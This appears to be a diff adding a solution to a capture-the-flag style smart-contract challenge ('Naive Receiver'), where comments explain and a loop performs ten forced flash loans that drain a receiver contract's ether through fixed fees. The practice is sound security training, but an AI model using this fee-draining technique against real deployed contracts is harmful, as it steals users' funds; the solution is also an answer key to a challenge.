@@ -50,6 +50,20 @@ contract NaiveReceiver is Test {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        // Here the pool when gives us ability to take flashloans from pool
+        // It takes constant FEE of 1 ether. So as to when we want to empty the
+        // NaiveReceiver's contract which contains 10 ether we can think of it as
+        // when we pay flashloan back it takes 1 ether from NaiveReceiver so we can
+        // call flashLoan but in receiveEther function it checks balance of the NaiveReceiver contract
+        // which should be greater than loan to be repaid. So to drain the NaiveReceiver's contract
+        // we can call flashloan 10 times which when repaid will drain the contract's ether as fee.
+        for (int256 i = 0; i < 10; i++) {
+            naiveReceiverLenderPool.flashLoan(
+                address(flashLoanReceiver),
+                10 ether
+            );
+        }
+
         /** EXPLOIT END **/
         validation();
     }
